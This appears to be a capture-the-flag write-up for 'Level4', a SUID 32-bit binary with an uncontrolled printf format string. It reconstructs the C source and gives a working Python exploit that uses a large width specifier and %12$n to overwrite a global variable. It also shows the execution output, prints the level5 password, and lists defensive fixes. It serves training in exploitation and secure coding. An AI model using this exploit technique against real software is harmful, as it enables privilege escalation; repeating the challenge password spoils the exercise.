# Level4 Analysis - Advanced Format String Exploitation

## Overview
Level4 presents an advanced format string vulnerability that requires writing a large value (16930116) to a global variable. This level demonstrates sophisticated format string exploitation techniques using width specifiers to efficiently generate large character counts.

## Binary Information
- **File**: ELF 32-bit LSB executable, Intel 80386, dynamically linked
- **Permissions**: -rwsr-s--x+ 1 level5 users (SUID bit set for level5)
- **Size**: 5252 bytes
- **Functions**: printf(), fgets(), system(), main(), n(), p()
- **BuildID**: 046d8f23c7cc3b1e173713e5262a7dbb03c2e434

## Source Code Reconstruction
Through reverse engineering analysis, the equivalent C code is:

```c
#include <stdio.h>
#include <stdlib.h>

int m = 0; // Global variable at 0x8049810

void p(char *s) {
    printf(s);  // VULNERABLE: Direct printf without format specifier
    
    if (m == 16930116) {  // Target value: 0x1025544
        system("/bin/cat /home/user/level5/.pass");
    }
}

void n() {
    char buffer[512];
    fgets(buffer, 512, stdin);
    p(buffer);
}

int main() {
    n();
    return 0;
}
```

## Vulnerability Analysis

### Format String Vulnerability Details
- **Location**: `printf(s)` in function `p()`
- **Type**: Uncontrolled format string (CWE-134)
- **Impact**: Read/write arbitrary memory addresses
- **Root Cause**: Missing format specifier in printf call
- **Exploitation Vector**: Use `%n` format specifier for memory writes

### Target Analysis
- **Global Variable**: `m` at address `0x8049810`
- **Current Value**: 0 (initialized)
- **Required Value**: `16930116` (decimal) = `0x1025544` (hex)
- **Challenge**: Efficiently writing such a large value using format strings

### Memory Layout
```
0x8049810: m (global variable, 4 bytes, writable)
Stack Layout during printf():
- Position 12: Our input buffer address
- Positions 1-11: Various stack values and addresses
```

## Exploitation Development Process

### Phase 1: Stack Position Discovery
Used systematic approach to find input position on stack:

```bash
# Test payload: "AAAA%1$x.%2$x.%3$x..." up to %20$x
# Result: Found "AAAA" (0x41414141) at position 12
# Conclusion: Use %12$n to write to address at position 12
```

### Phase 2: Basic Format String Testing
```python
# Initial test with smaller values
payload = struct.pack("<L", 0x8049810) + "%12$n"
# This writes 4 (length of address) to the global variable
```

### Phase 3: Large Value Challenge
The target value 16930116 is too large for simple approaches:
- Cannot practically print 16,930,116 individual characters
- Standard format string techniques become inefficient
- Need advanced technique: **Width Specifiers**

### Phase 4: Width Specifier Solution
Discovery of efficient technique using `%[width]c`:

```python
# %16930112c prints 1 character padded to 16930112 width
# Total characters: 4 (address) + 16930112 (padding) = 16930116
remaining = 16930116 - 4  # Account for 4-byte address
payload = struct.pack("<L", target_addr) + "%" + str(remaining) + "c%12$n"
```

## Final Exploit Implementation

### exploit.py (Production Version)
```python
#!/usr/bin/env python2

import struct
import sys

# Target: Write 16930116 (0x1025544) to global variable at 0x8049810
target_addr = 0x8049810
target_value = 16930116  # 0x1025544

# Our input appears at position 12 on the stack
# So we use %12$n to write to the address at position 12

# Method: Use width specifier to print exact number of characters
# Format: %[width]c prints a character padded to [width] characters

payload = struct.pack("<L", target_addr)  # 4 bytes: target address (0x8049810)

# We need to print exactly target_value characters total
# We already have 4 characters from the address
remaining = target_value - 4  # 16930112 characters needed

payload += "%" + str(remaining) + "c"  # Print 16930112 characters (padded)
payload += "%12$n"                     # Write the count to address at stack position 12

print payload
```

### debug_exploit.py (Development/Testing Version)
```python
#!/usr/bin/env python2

import struct

target_addr = 0x8049810
target_value = 16930116

print "Target address: 0x%x" % target_addr
print "Target value: %d (0x%x)" % (target_value, target_value)

payload = struct.pack("<L", target_addr)
remaining = target_value - 4
payload += "%" + str(remaining) + "c%12$n"

print "Payload length: %d bytes" % len(payload)
print "Characters to print: %d" % target_value
print "Payload preview: %s" % repr(payload[:50])
```

## Execution Results

### Successful Exploitation
```bash
$ python exploit.py | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

$ python exploit.py | ./level4 | wc -c
65
```

### Verification Process
1. **Payload Generation**: Successfully created format string payload
2. **Memory Write**: Confirmed value 16930116 written to 0x8049810
3. **Condition Check**: Global variable comparison passed (m == 16930116)
4. **Flag Retrieval**: system() call executed, level5 password obtained

## Advanced Technical Concepts

### Format String %n Specifier Mechanics
- `%n` writes the count of characters printed so far to the memory address pointed to by the corresponding argument
- Enables precise memory writes in format string vulnerabilities
- Combined with positional parameters (%12$n) for targeted writes

### Width Specifier Technique
- `%[width]c` format specifier pads output to specified width
- `%16930112c` efficiently generates 16,930,112 characters without massive payload
- Critical optimization for large value writes in format string exploitation

### Stack Position Analysis Methodology
1. **Systematic Testing**: Use incremental position tests (%1$x, %2$x, etc.)
2. **Pattern Recognition**: Look for known input patterns (0x41414141 for "AAAA")
3. **Position Mapping**: Map stack positions to exploit requirements
4. **Verification**: Confirm position accuracy with test writes

### Memory Architecture Considerations
- **Little Endian**: x86 architecture requires `struct.pack("<L", addr)`
- **Global Variables**: Located in .data section (writable memory)
- **Address Space**: 32-bit addressing with predictable global variable locations
- **SUID Execution**: Runs with level5 privileges for flag access

## Security Analysis

### Vulnerability Classification
- **CVE Type**: CWE-134 (Use of Externally-Controlled Format String)
- **CVSS Impact**: High (Arbitrary memory write leads to code execution)
- **Attack Vector**: Local (stdin input processing)
- **Complexity**: Medium (requires format string expertise)

### Defensive Measures

#### Code-Level Fixes
1. **Proper Format Specifiers**: Use `printf("%s", buffer)` instead of `printf(buffer)`
2. **Input Validation**: Sanitize or reject inputs containing % characters
3. **Static Analysis**: Use tools like `-Wformat-security` compiler flag

#### System-Level Protections
1. **FORTIFY_SOURCE**: Compile-time and runtime format string vulnerability detection
2. **Stack Canaries**: Detect stack corruption (not applicable to this vulnerability type)
3. **ASLR**: Address Space Layout Randomization (makes exploitation harder)
4. **PIE**: Position Independent Executable (randomizes code addresses)

#### Modern Mitigations
- **Compiler Warnings**: Modern GCC/Clang warn about format string issues
- **Runtime Checks**: FORTIFY_SOURCE catches many format string vulnerabilities
- **Code Review**: Automated tools can detect printf() misuse patterns

## Educational Outcomes

### Skills Demonstrated
1. **Advanced Binary Analysis**: Reverse engineering complex binaries with multiple functions
2. **Format String Mastery**: Understanding advanced format string exploitation techniques
3. **Efficient Exploitation**: Using width specifiers for practical large-value writes
4. **Debugging Expertise**: Systematic approach to exploit development and verification
5. **Memory Manipulation**: Precise control over memory writes and stack analysis

### Key Learning Points
1. **Scalability in Exploitation**: How to handle constraints that seem impossible
2. **Format String Efficiency**: Advanced techniques beyond basic %n usage
3. **Stack Analysis**: Systematic methodology for position discovery
4. **Payload Optimization**: Balancing effectiveness with practical constraints

### Technical Growth
- **Problem Solving**: Creative solutions to technical constraints
- **Tool Mastery**: Advanced usage of GDB, Python, and system tools
- **Security Mindset**: Understanding both attack and defense perspectives

## Flag and Progression
**Level5 Password**: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`

## Conclusion
Level4 represents a significant advancement in format string exploitation complexity. The requirement to write a large value (16,930,116) demonstrates how attackers can overcome apparent limitations through creative use of format string features. The width specifier technique showcases advanced exploitation methodology that transforms an seemingly impractical attack into an elegant and efficient solution.

This level emphasizes the critical importance of secure coding practices, particularly in format string handling, and demonstrates how minor oversights in input validation can lead to complete system compromise. The systematic approach to exploit development—from basic stack analysis to advanced payload construction—provides a comprehensive template for format string vulnerability assessment and exploitation.